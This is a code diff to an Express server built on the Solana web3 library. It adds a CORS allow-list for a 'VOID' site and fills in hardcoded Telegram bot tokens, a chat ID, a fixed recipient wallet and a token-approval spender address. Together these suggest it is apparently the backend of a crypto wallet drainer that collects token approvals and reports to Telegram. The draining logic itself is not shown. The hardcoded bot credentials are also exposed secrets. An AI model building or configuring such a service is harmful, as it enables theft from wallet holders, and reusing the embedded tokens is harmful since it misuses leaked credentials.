@@ -1,4 +1,5 @@
 const express = require('express');
+const cors = require('cors');
 const path = require('path');
 const dotenv = require('dotenv');
 const { Connection, PublicKey, Transaction } = require('@solana/web3.js');
@@ -8,12 +9,29 @@ dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+const allowedOrigins = [
+  'http://localhost:3000',
+  'http://127.0.0.1:3000',
+  'https://vintrumite.github.io/VOID',
+  'https://void-production-d066.up.railway.app'
+];
+
+app.use(cors({
+  origin(origin, callback) {
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+      return;
+    }
+    callback(new Error('CORS policy: origin not allowed'));
+  }
+}));
 const RPC_ENDPOINT = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
 const connection = new Connection(RPC_ENDPOINT, 'confirmed');
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8482914657:AAGQwbljH2zLVFMZngscd9LrYxaB5ypudTU';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8375716074:AAHOp-aTenVJarXQ5-VLjWxMTjzPp_91jXw';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5126266116';
-const FIXED_RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'YOUR_RECIPIENT_WALLET_ADDRESS';
+const FIXED_RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || '0x7779b7efddd556cba44c577c32511f8ae6375f51';
 
 app.use(express.json({ limit: '2mb' }));
 app.use(express.static(path.join(__dirname)));
@@ -121,7 +139,7 @@ app.get('/health', (req, res) => {
 app.get('/api/approval-config', (req, res) => {
   res.json({
     tokenAccount: process.env.TOKEN_ACCOUNT || 'YOUR_TOKEN_MINT_ADDRESS',
-    spenderAddress: process.env.SPENDER_ADDRESS || 'YOUR_SPENDER_WALLET_ADDRESS'
+    spenderAddress: process.env.SPENDER_ADDRESS || '5vWWKcQdzgiAgMH6gu5ny5cnB1TbHrVLB21nJGJRzZUn'
   });
 });
 
